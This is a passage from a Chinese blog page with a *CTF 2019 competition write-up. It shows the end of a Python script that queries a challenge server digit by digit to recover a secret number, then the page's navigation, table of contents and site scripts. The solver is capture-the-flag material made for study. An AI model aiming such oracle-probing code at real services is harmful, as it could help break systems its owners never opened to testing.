class="number">-1</span>]</span><br><span class="line">            <span class="keyword">print</span> lastNum</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> int(s.split(<span class="string">':'</span>)[<span class="number">-1</span>]) &lt;= int(lastNum) <span class="keyword">and</span> int(s.split(<span class="string">':'</span>)[<span class="number">-1</span>]) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> int(s.split(<span class="string">':'</span>)[<span class="number">-1</span>]) &lt; int(lastNum):</span><br><span class="line">                lastNum = s.split(<span class="string">':'</span>)[<span class="number">-1</span>]</span><br><span class="line">            tmpt += <span class="number">10</span>**bit_label</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> int(s.split(<span class="string">':'</span>)[<span class="number">-1</span>]) != <span class="number">0</span>:</span><br><span class="line">                lastNum = s.split(<span class="string">':'</span>)[<span class="number">-1</span>]</span><br><span class="line">            tmpt -= <span class="number">10</span>**bit_label</span><br><span class="line">            bit_label -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> bit_label &lt; <span class="number">0</span>:</span><br><span class="line">                tmpt += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmpt += <span class="number">10</span>**bit_label</span><br><span class="line">        <span class="keyword">print</span> tmpt</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> tmpt</span><br><span class="line">    <span class="keyword">print</span> primeDict[tmpt]</span><br><span class="line">    conn.interactive()</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/blog/publi/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
          
            <a href="/blog/publi/tags/赛后总结/" rel="tag"><i class="fa fa-tag"></i> 赛后总结</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/blog/publi/2019/04/22/第十二届全国大学生信息安全竞赛回顾" rel="next" title="第十二届全国大学生信息安全竞赛回顾">
                <i class="fa fa-chevron-left"></i> 第十二届全国大学生信息安全竞赛回顾
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/blog/publi/2019/05/22/rctf-2019-writeup" rel="prev" title="rctf 2019 writeup">
                rctf 2019 writeup <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  
    <div class="comments" id="comments">
      <div id="vcomments"></div>
    </div>
  


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/blog/publi/images/1.png"
                alt="Ainassine" />
            
              <p class="site-author-name" itemprop="name">Ainassine</p>
              <p class="site-description motion-element" itemprop="description">不做重复的事。</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/blog/publi/archives/">
              
                  <span class="site-state-item-count">18</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/blog/publi/categories/index.html">
                  <span class="site-state-item-count">20</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/blog/publi/tags/index.html">
                  <span class="site-state-item-count">30</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/blog/publi/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          <div class="links-of-author motion-element">
            
              
                <span class="links-of-author-item">
                  <a href="https://github.com/Joeeyy" target="_blank" title="GitHub">
                    
                      <i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
                <span class="links-of-author-item">
                  <a href="mailto:joeeeee@foxmail.com" target="_blank" title="E-Mail">
                    
                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                </span>
              
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-globe"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://exmaple.com" title="Test" target="_blank">Test</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF-2019-Writeup"><span class="nav-number">1.</span> <span class="nav-text">*CTF 2019 - Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-Web-mywebsql"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 Web - mywebsql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Misc-Checkin"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 Misc - Checkin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Misc-She"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 Misc - She</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Misc-babyflash"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 Misc - babyflash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Misc-otaku"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 Misc - otaku</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Crypto-babyprng-amp-babyprng2"><span class="nav-number">1.6.</span> <span class="nav-text">0x05 Crypto - babyprng & babyprng2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Crypto-notcurves"><span class="nav-number">1.7.</span> <span class="nav-text">0x05 Crypto - notcurves</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ainassine</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">20.0k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>



<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/blog/publi/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/blog/publi/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/blog/publi/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/blog/publi/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/blog/publi/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/blog/publi/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/blog/publi/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  






  
  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/valine@1.1.4/dist/Valine.min.js"></script>
  <script type="text/javascript">
    new Valine({
        av: AV,
        el: '#vcomments' ,
        verify: true,
        notify: true,
        app_id: 'RNU69dfOuHjI6UeBMUnrfc9r-gzGzoHsz',
        app_key: 'CjUKxBDwv46j3eAbL1XHPmh9',
        placeholder: '想说点什么？'
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/blog/publi/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("RNU69dfOuHjI6UeBMUnrfc9r-gzGzoHsz", "CjUKxBDwv46j3eAbL1XHPmh9");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  

  

  

</body>
</html>
